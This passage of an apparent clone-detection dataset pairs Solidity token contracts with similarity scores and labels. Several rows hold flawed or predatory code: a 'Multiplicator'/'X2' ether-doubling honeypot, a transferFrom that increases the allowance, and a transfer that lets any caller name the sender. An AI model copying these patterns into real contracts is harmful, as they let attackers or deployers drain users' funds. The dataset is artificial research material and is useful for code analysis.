    function safeDiv(uint a, uint b) pure internal returns (uint) {
    assert(b > 0); 
    uint c = a / b;
     assert(a == b * c + a % b); 
    return c;
  }
}",1,,,,,
"contract DappTokenSale{
    address admin;
    DappToken public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

    constructor(DappToken _tokenContract, uint256 _tokenPrice)public{
        
        
        admin = msg.sender;

        
        tokenContract = _tokenContract;

        
        tokenPrice = _tokenPrice;
    }

    
    
    
    
    function multiply(uint x, uint y) internal pure returns(uint z) {
        require( y == 0|| (z = x* y ) / y == x);
    }       


    
    function buyTokens(uint256 _numberOfTokens) public payable{
        
        
        require(msg.value == multiply(_numberOfTokens, tokenPrice));

        
        require(tokenContract.balanceOf(address(this)) >= _numberOfTokens);

        
        require(tokenContract.transfer(msg.sender, _numberOfTokens));  
        
        
        tokensSold += _numberOfTokens;

        
        emit Sell(msg.sender, _numberOfTokens);
    }

    
    function endSale() public {
        
        require(msg.sender == admin);
        
        require(tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));
        
            
            
            
        selfdestruct(msg.sender);

    }
}",0.945877287,"contract DappTokenSale {

    address admin;

    DappToken public tokenContract;

    uint256 public tokenPrice;

    uint256 public tokensSold;



    event Sell(address _buyer, uint256 _amount);



    function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {

        admin = msg.sender;

        tokenContract = _tokenContract;

        tokenPrice = _tokenPrice;

    }



    function multiply(uint x, uint y) internal pure returns (uint z) {

        require(y == 0 || (z = x * y) / y == x);

    }



    function buyTokens(uint256 _numberOfTokens) public payable {

        require(msg.value == multiply(_numberOfTokens, tokenPrice));

        require(tokenContract.balanceOf(this) >= _numberOfTokens);

        require(tokenContract.transfer(msg.sender, _numberOfTokens));



        tokensSold += _numberOfTokens;



        Sell(msg.sender, _numberOfTokens);

    }



    function endSale() public {

        require(msg.sender == admin);

        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));



        

        

        admin.transfer(address(this).balance);

    }

}",1,,,,,
"contract ERC20Basic{

function balanceOf(address _owner) external constant returns (uint256 balance);
function transfer(address to, uint256 value) public returns (bool);


}",0.911718509,"contract tokenInterface {
	function balanceOf(address _owner) public constant returns (uint256 balance);
	function transfer(address _to, uint256 _value) public returns (bool);
}",1,,,,,
"contract ERC20{

function totalSupply() constant returns (uint256 totalSupply) {}
function balanceOf(address _owner) constant returns (uint256 balance) {}
function transfer(address _recipient, uint256 _value) returns (bool success) {}
function transferFrom(address _from, address _recipient, uint256 _value) returns (bool success) {}
function approve(address _spender, uint256 _value) returns (bool success) {}
function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

event Transfer(address indexed _from, address indexed _recipient, uint256 _value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);


}",0.900791783,"contract ERC20Interface {

  

  event Transfer(address indexed _from, address indexed _to, uint _value);
  event Approval(address indexed _owner, address indexed _spender, uint _value);

  

  function totalSupply() constant public returns (uint);
  function balanceOf(address _owner) constant public returns (uint balance);
  function transfer(address _to, uint _value) public returns (bool success);
  function transferFrom(address _from, address _to, uint _value) public returns (bool success);
  function approve(address _spender, uint _value) public returns (bool success);
  function allowance(address _owner, address _spender) constant public returns (uint remaining);

}",1,,,,,
"contract FuncToken is IERC20{

using SafeMath for uint256;

uint public constant _totalSupply = 0;

string public constant symbol = ""UB"";
string public constant name = ""UNIFIED BET"";
uint8 public constant decimals = 18;


uint256 public constant RATE = 1;

address public owner;

mapping (address => uint256) balances;
mapping (address => mapping(address => uint256)) allowed;

function () payable{
    createToken();
}

constructor (){
    owner = msg.sender;

}

function createToken() payable {
    require(msg.value > 0);

    uint256 tokens = msg.value;
    balances[msg.sender] = balances[msg.sender].add(tokens);

    owner.transfer(msg.value);
}

function totalSupply() constant returns (uint256 totalSupply){
    return _totalSupply;
}

function balanceOf(address _owner) constant returns (uint256 balance){
    return balances[_owner];
}

function transfer(address _to, uint256 _value) returns (bool success){
    require (
        balances[msg.sender] >= _value
        && _value > 0
        );
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        
        return true;

}

function transferFrom(address _from, address _to, uint256 _value) returns (bool success){
    require(
        allowed[_from][msg.sender] >= _value
        && balances[_from] >= _value
        && _value > 0
        );

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].add(_value);
        Transfer(_from, _to, _value);
        return true;
}

function approve(address _spender, uint256 _value) returns (bool success){
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
}

function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
}

}",0.997122163,"contract UBToken is IERC20{

    

    using SafeMath for uint256;

    

    uint public constant _totalSupply = 0;

    

    string public constant symbol = ""UB"";

    string public constant name = ""UNIFIED BET"";

    uint8 public constant decimals = 18;

    

    

    uint256 public constant RATE = 1;

    

    address public owner;

    

    mapping (address => uint256) balances;

    mapping (address => mapping(address => uint256)) allowed;

    

    function () payable{

        createToken();

    }

    

    constructor (){

        owner = msg.sender;

        

    }

    

    function createToken() payable {

        require(msg.value > 0);

        

        uint256 tokens = msg.value;

        balances[msg.sender] = balances[msg.sender].add(tokens);

        

        owner.transfer(msg.value);

    }

    

    function totalSupply() constant returns (uint256 totalSupply){

        return _totalSupply;

    }

    

    function balanceOf(address _owner) constant returns (uint256 balance){

        return balances[_owner];

    }

    

    function transfer(address _to, uint256 _value) returns (bool success){

        require (

            balances[msg.sender] >= _value

            && _value > 0

            );

            balances[msg.sender] = balances[msg.sender].sub(_value);

            balances[_to] = balances[_to].add(_value);

            Transfer(msg.sender, _to, _value);

            return true;

            

    }

    

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success){

        require(

            allowed[_from][msg.sender] >= _value

            && balances[_from] >= _value

            && _value > 0

            );

            

            balances[_from] = balances[_from].sub(_value);

            balances[_to] = balances[_to].add(_value);

            allowed[_from][msg.sender] = allowed[_from][msg.sender].add(_value);

            Transfer(_from, _to, _value);

            return true;

    }

    

    function approve(address _spender, uint256 _value) returns (bool success){

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }

    

}",1,,,,,
"contract admined{
    address public admin;

    function admined(){
        admin = msg.sender;
    }

    modifier onlyAdmin(){
        require(msg.sender == admin);
        _;
    }

    function transferAdminRol(address newAdmin)public onlyAdmin {
        admin = newAdmin;
    }

}",0.952243147,"contract admined {
	address public admin;

	function admined(){
		admin = msg.sender;
	}

	modifier onlyAdmin(){
		require(msg.sender == admin);
		_;
	}

	function transferAdminship(address newAdmin) onlyAdmin {
		admin = newAdmin;
	}

}",1,,,,,
"contract Mortal is Owned{

  function destroy() public onlyOwner {
    selfdestruct(owner);
  }
}",0.923876582,"contract Mortal is Owned {

    

    

    

    

    function close() public onlyOwner {

        selfdestruct(owner);

    }

}",1,,,,,
"contract Test is MintableToken {

  string public constant name = ""TestToken"";
  string public constant symbol = ""TET"";
  uint8 public constant decimals = 2;

}",0.90610544,"contract TGCToken is MintableToken {
    string public constant name = ""TGCToken"";
    string public constant symbol = ""TGC"";
    uint8 public constant decimals = 18;
}",1,,,,,
"contract MyToken is StandardToken {
  string public name = 'Membership Token';
  string public symbol = 'MTKO';
  uint8 public decimal = 18;
  uint public INITIAL_SUPPLY = 1000000;

 constructor() public {
  totalSupply_ = INITIAL_SUPPLY;
  balances[msg.sender] = INITIAL_SUPPLY;
 }
}",0.902939251,"contract TutorialToken is StandardToken {

	string public name = ""IOTG"";

	string public symbol = ""TXT"";

	uint8 public decimals = 18;

	uint public INITIAL_SUPPLY = 1000000000*(10**18);



	constructor() public {

  	totalSupply_ = INITIAL_SUPPLY;

  	balances[msg.sender] = INITIAL_SUPPLY;

	}

}",1,,,,,
"contract ERC20 {
        
        function totalSupply() constant returns (uint totalSupply);

        function balanceOf(address _owner) constant returns (uint balance);
        function transfer(address _to, uint _value) returns (bool success);
        function transferFrom(address _from, address _to, uint _value) returns (bool success);
        function approve(address _spender, uint _value) returns (bool success);
        function allowance(address _owner, address _spender) constant returns (uint remaining);

        event Transfer(address indexed _from, address indexed _to, uint _value);
        event Approval(address indexed _owner, address indexed _spender, uint _value);
    }",0.981692009,"contract Token {

    
    function totalSupply() constant returns (uint supply) {}

    
    
    function balanceOf(address _owner) constant returns (uint balance) {}

    
    
    
    
    function transfer(address _to, uint _value) returns (bool success) {}

    
    
    
    
    
    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}

    
    
    
    
    function approve(address _spender, uint _value) returns (bool success) {}

    
    
    
    function allowance(address _owner, address _spender) constant returns (uint remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}",1,,,,,
"contract VeteranCoinInterface {
    
    
    uint256 public totalSupply;

    
    
    function balanceOf(address _owner) public view returns (uint256 balance);

    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success);

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success);

    
    
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value); 
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.984224064,"contract EIP20Interface {
    
    
    uint256 public totalSupply;

    
    
    function balanceOf(address _owner) public view returns (uint256 balance);

    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success);

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success);

    
    
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract TestToken is StandardToken {

string public name = ""Token"";
string public symbol = ""T1"";
uint8 public decimals = 18;
uint public INITIAL_SUPPLY = 4000000000000000000000000000;

constructor() public {
  totalSupply_ = INITIAL_SUPPLY;
  balances[msg.sender] = INITIAL_SUPPLY;
}
}",0.904188281,"contract AimToken is PausableToken {
    string public name = ""Aimersion"";
    string public symbol = ""AIM"";
    uint8 public decimals = 18;
    uint public INITIAL_SUPPLY = 2780000000000000000000000000;

    constructor() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }
}",1,,,,,
"contract MyToken is BurnableCrowdsaleToken {
    function MyToken(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable)
    CrowdsaleToken(_name, _symbol, _initialSupply, _decimals, _mintable) {
  }
}",0.93539242,"contract CargoXToken is CrowdsaleToken {

  function CargoXToken(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable)
    CrowdsaleToken(_name, _symbol, _initialSupply, _decimals, _mintable) {
  }

}",1,,,,,
"contract Multiplicator
{
    address public Owner = msg.sender;

    function() payable{}

    function withdraw() payable public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function multiplicate(address adr) payable
    {
        if(msg.value >= this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}",0.936506556,"contract X2
{
        address public Owner = msg.sender;

        function() public payable{}

        function withdraw()  payable public
        {
                require(msg.sender == Owner);
                Owner.transfer(this.balance);
        }

        function multiplicate(address adr) public payable
        {
            if(msg.value>=this.balance)
            {
                adr.transfer(this.balance+msg.value);
            }
        }


}",1,,,,,
"contract TestToken is StandardToken {
    string public name = ""TMED Token"";
    string public symbol = ""TMED1"";
    uint8 public decimals = 18;
    uint public INITIAL_SUPPLY = 4000000000000000000000000000;
    constructor() public {
      totalSupply_ = INITIAL_SUPPLY;
      balances[msg.sender] = INITIAL_SUPPLY;
    }
    }",0.936858442,"contract YSToken is StandardToken {

    string public name = ""Yu Shi Token"";

    string public symbol = ""YST"";

    uint8 public decimals = 18;

    uint public INITIAL_SUPPLY = 500000000000000000000000000;



    constructor() public {

        totalSupply_ = INITIAL_SUPPLY;

        balances[msg.sender] = INITIAL_SUPPLY;

    }

}",1,,,,,
"contract ERC721 {
  event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);
  event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);

  function totalSupply() constant returns (uint256 totalSupply); 
  function implementsERC721() public pure returns (bool); 
  function balanceOf(address _owner) public view returns (uint256 _balance); 
  function ownerOf(uint256 _tokenId) public view returns (address _owner); 
  function transfer(address _to, uint256 _tokenId) public; 
  function approve(address _to, uint256 _tokenId) public; 
  function takeOwnership(uint256 _tokenId) public; 
  function transferFrom(address _from, address _to, uint _tokenId) public; 
}",0.969344367,"contract ERC721 {
  
  function approve(address _to, uint256 _tokenId) public;
  function balanceOf(address _owner) public view returns (uint256 balance);
  function implementsERC721() public pure returns (bool);
  function ownerOf(uint256 _tokenId) public view returns (address addr);
  function takeOwnership(uint256 _tokenId) public;
  function totalSupply() public view returns (uint256 total);
  function transferFrom(address _from, address _to, uint256 _tokenId) public;
  function transfer(address _to, uint256 _tokenId) public;

  event Transfer(address indexed from, address indexed to, uint256 tokenId);
  event Approval(address indexed owner, address indexed approved, uint256 tokenId);

  
  
  
  
  
}",1,,,,,
"contract SToken is MintableToken {
    string public constant name = ""SS Token"";
    string public constant symbol = ""SKS"";
    uint8 public constant decimals = 2;
}",0.906380853,"contract ALMToken is MintableToken {

    string public constant name = ""Almee Token"";

    string public constant symbol = ""ALM"";

    uint8 public constant decimals = 18;



}",1,,,,,
"contract AirtimeToken is StandardToken {
    string public name = ""AirtimeToken"";
    string public symbol = ""AirTK"";
    uint8 public decimals = 18;
    uint public INITIAL_SUPPLY = 12000;


constructor () public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;

    }

}",0.920247206,"contract LieMiToken is StandardToken {
    string public name = ""LieMiToken"";
    string public symbol = ""LMI"";
    uint8 public decimals = 18;
    uint public INITIAL_SUPPLY = 100000000;
    
    constructor() public {
      totalSupply_ = INITIAL_SUPPLY;
      balances[msg.sender] = INITIAL_SUPPLY;
    }
}",1,,,,,
"contract StandardTokenInterface {
    
    
    uint256 public totalSupply;

    
    
    function balanceOf(address _owner) public view returns (uint256 balance);

    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success);

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success);

    
    
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.981746466,"contract EIP20Interface {
    
    
    uint256 public totalSupply;

    
    
    function balanceOf(address _owner) public view returns (uint256 balance);

    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success);

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success);

    
    
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract MyToken is StandardToken{

    string public name = ""MyToken"";
    string public symbol = ""MYT"";
    uint8 public decimals = 10;
    uint public INITIAL_SUPPLY = 100000000000000000;

    constructor() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }

}",0.914033754,"contract TutorialToken is StandardToken {

	string public name = ""IOTG"";

	string public symbol = ""TXT"";

	uint8 public decimals = 18;

	uint public INITIAL_SUPPLY = 1000000000*(10**18);



	constructor() public {

  	totalSupply_ = INITIAL_SUPPLY;

  	balances[msg.sender] = INITIAL_SUPPLY;

	}

}",1,,,,,
"contract TRC20{
     string public name;
     string public symbol;
     uint8 public decimals = 8;
     uint256 public totalSupply;

 mapping (address=> uint256) public balanceOf;
 mapping(address=> mapping(address=>uint256)) public allowance;

 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed _owner, address indexed _spender, uint256 value);
 event Burn(address indexed from, uint256 value);

 uint256 initialSupply = 1000000;
 string tokenName = 'CodeXpertToken';
 string tokenSymbol = 'CDX';



 constructor() public{

     totalSupply = initialSupply*10**uint256(decimals);
     balanceOf[msg.sender] = totalSupply;
     name = tokenName;
     symbol = tokenSymbol;

 }

 function _transfer(address _from, address _to, uint _value) internal{

     
     require(balanceOf[_from]>=_value);
     require(balanceOf[_to] + _value>=balanceOf[_to]);
     uint previousBalances = balanceOf[_from] + balanceOf[_to];

     balanceOf[_from] -= _value;
     balanceOf[_to] +=_value;
     emit Transfer(_from, _to, _value);
     assert(balanceOf[_from]+balanceOf[_to]==previousBalances);



 }

 function transfer(address _to, uint256 _value) public payable returns (bool success){
     _transfer(msg.sender, _to, _value);
     return  true;
 }

 function transferFrom(address _from, address _to, uint256 _value) public returns(bool success){

     require(_value<= allowance[_from][msg.sender]);
     _transfer(_from, _to, _value);
     return true;
 }

 function approve(address _spender, uint256 _value) public returns (bool success){
     allowance[msg.sender][_spender] = _value;
     emit Approval(msg.sender, _spender, _value);

     return true;

 }
}",0.903402115,"contract TokenERC20 {

    

    string public name;

    string public symbol;

    uint8 public decimals = 18;

    

    uint256 public totalSupply;



    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);



    

    constructor() public {

        totalSupply = 12000000000 * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;                

        name = ""DCETHER"";                                   

        symbol = ""DCETH"";                               

    }



    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value > balanceOf[_to]);

        

        uint previousBalances = balanceOf[_from] + balanceOf[_to];

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

        

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

    }



    

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= allowance[_from][msg.sender]);     

        allowance[_from][msg.sender] -= _value;

        _transfer(_from, _to, _value);

        return true;

    }



    

    function approve(address _spender, uint256 _value) public

        returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        return true;

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, this, _extraData);

            return true;

        }

    }

}",1,,,,,
"contract tokenRecipient {
  function receiveApproval(address _from, uint _value, address _token, bytes _extraData);
}",0.966928989,"contract tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData); }",,,,,,1
"contract A{
    address owner;

    constructor() public{
        owner = msg.sender;
    }
}",0.924326661,"contract Empty {

    address owner;



    constructor () public {

        owner = msg.sender;

    }

}",1,,,,,
"contract MyToken is MintableToken {
  string public constant name = ""MyToken"";
  string public constant symbol = ""MyToken"";
  uint public constant decimals = 18;
}",0.914275775,"contract TGCToken is MintableToken {
    string public constant name = ""TGCToken"";
    string public constant symbol = ""TGC"";
    uint8 public constant decimals = 18;
}",1,,,,,
"contract EIP20Interface {

    uint256 public totalSupply;

    function balanceOf(address _owner) public view returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);


    function approve(address _spender, uint256 _value) public returns (bool success);


    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

event Transfer(address indexed _from, address indexed _to, uint256 _value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.98251092,"contract ERC20 {
  uint256 public totalSupply;
  function balanceOf(address _owner) view public returns (uint256 balance);
  function transfer(address _to, uint256 _value) public returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
  function approve(address _spender, uint256 _value) public returns (bool success);
  function allowance(address _owner, address _spender) view public returns (uint256 remaining);
  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract TokenERC20 {

string public name;
string public symbol;
uint8 public decimals = 3;

uint256 public totalSupply;",0.90415512,"contract tokenInterface{

    uint256 public totalSupply;

    uint8 public decimals;

    string public symbol;

    string public name;

}",1,,,,,
"contract Token {
    function totalSupply() constant public returns (uint256 supply);
    function balanceOf(address _owner) constant public returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success) ;
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) ;
    function approve(address _spender, uint256 _value) public returns (bool success) ;
    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) ;
}",0.926930212,"contract ERC20 is ERC20Events {
    function totalSupply() public view returns (uint256);
    function balanceOf(address _addr) public view returns (uint256 balance);
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
}",1,,,,,
"contract TokenInterface {
    function balanceOf(address _owner) constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) returns (bool success);
}",0.930529387,"contract ERC20Interface {

    

    function transfer(address _to, uint256 _value) returns (bool success);

    

    function balanceOf(address _owner) constant returns (uint256 balance);

}",1,,,,,
"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public{
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable internal{
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() afterDeadline public{
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() afterDeadline public{
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",0.995283219,"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable public {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() public afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",1,,,,,
"contract ERC20Interface {
function balanceOf(address whom) view public returns (uint);
}",0.946229682,"contract ERC20Interface {

    function balanceOf(address who) public view returns (uint256);

}",1,,,,,
"contract ERC20 {
  function totalSupply() public view returns (uint256);

  function balanceOf(address _who) public view returns (uint256);

  function allowance(address _owner, address _spender)
    public view returns (uint256);

  function transfer(address _to, uint256 _value) public returns (bool);

  function approve(address _spender, uint256 _value)
    public returns (bool);

  function transferFrom(address _from, address _to, uint256 _value)
    public returns (bool);

  function decimals() public view returns (uint256);

  event Transfer(
    address indexed from,
    address indexed to,
    uint256 value
  );

  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );
}",0.933334079,"contract Erc20

{   

    

    function totalSupply() public view returns (uint256 amount);

    function balanceOf(address owner) public view returns (uint256 balance);

    function transfer(address to, uint256 value) public returns (bool success);

    function transferFrom(address from, address to, uint256 value) public returns (bool success);

    function approve(address spender, uint256 value) public returns (bool success);

    function allowance(address owner, address spender) public view returns (uint256 remaining);

    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}",1,,,,,
"contract ERC20 {
    function totalSupply() constant returns (uint totalSupply);
    function balanceOf(address _owner) constant returns (uint balance);
    function transfer(address _to, uint _value) returns (bool success);
    event Transfer(address indexed _from, address indexed _to, uint _value);
}",0.976166673,"contract ERC20Partial {
    function totalSupply() constant returns (uint totalSupply);
    function balanceOf(address _owner) constant returns (uint balance);
    function transfer(address _to, uint _value) returns (bool success);
    
    
    
    event Transfer(address indexed _from, address indexed _to, uint _value);
    
}",1,,,,,
"contract MyToken {
    string public name;
    string public symbol;
    uint8 public decimals;

    mapping (address => uint256) public balanceOf;
    event Transfer(address _from, address _to, uint _value);

    constructor(string memory tokenName, string memory tokenSymbol, uint8 decimalUnits, uint256 initialSupply) public {
        name = tokenName;
        symbol = tokenSymbol;
        decimals = decimalUnits;
        balanceOf[msg.sender] = initialSupply;
        }

    function transfer(address _to, uint256 _value) public {
        require(_value <= balanceOf[msg.sender]);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
    }
}",0.919107316,"contract TheCoinBBToken {

    

    string public name;

    

    string public symbol;

    

    uint public decimals;



    

    event Transfer(address indexed from, address indexed to, uint256 value);



    

    mapping(address => uint256) public balanceOf;





    

    function TheCoinBBToken(uint256 initialSupply,string tokenName, string tokenSymbol, uint8 decimalUnits) public {

        

        balanceOf[msg.sender] = initialSupply;

        name = tokenName;                                 

        symbol = tokenSymbol;                               

        decimals = decimalUnits; 

    }



    

    function transfer(address _to,uint256 _value) public {

        

        require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;

        

        Transfer(msg.sender, _to, _value);

    }



}",2,,,,,
"contract OwnedToken {    TokenCreator public creator; address public owner; string public name;   function OwnedToken(string _name) { owner = msg.sender;     creator = TokenCreator(msg.sender); name = _name; } function changeName(string newName) {    if (msg.sender == address(creator)) name = newName; } function transfer(address newOwner) {  if (msg.sender != owner)  return;      if (creator.isTokenTransferOK(owner, newOwner)) owner = newOwner; }}",0.92097962,"contract OwnedToken {

    

    

    

    TokenCreator creator;

    address owner;

    bytes32 name;



    

    

    constructor(bytes32 _name) public {

        

        

        

        

        

        

        

        

        owner = msg.sender;



        

        

        

        

        creator = TokenCreator(msg.sender);

        name = _name;

    }



    function changeName(bytes32 newName) public {

        

        

        

        if (msg.sender == address(creator))

            name = newName;

    }



    function transfer(address newOwner) public {

        

        if (msg.sender != owner) return;



        

        

        

        

        

        if (creator.isTokenTransferOK(owner, newOwner))

            owner = newOwner;

    }

}",1,,,,,
"contract MyToken {
    
    mapping (address => uint256) public balanceOf;

    
    function MyToken(
        uint256 initialSupply
        ) {
        balanceOf[msg.sender] = initialSupply;              
    }

    
    function transfer(address sender, address _to, uint256 _value) {
        require(balanceOf[sender] >= _value);           
        require(balanceOf[_to] + _value >= balanceOf[_to]); 
        balanceOf[sender] -= _value;                    
        balanceOf[_to] += _value;                           
    }
}",0.906087654,"contract MyToken {
    
    mapping (address => uint256) public balanceOf;

    
    function MyToken(
        uint256 initialSupply
        ) {
        balanceOf[msg.sender] = initialSupply;              
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
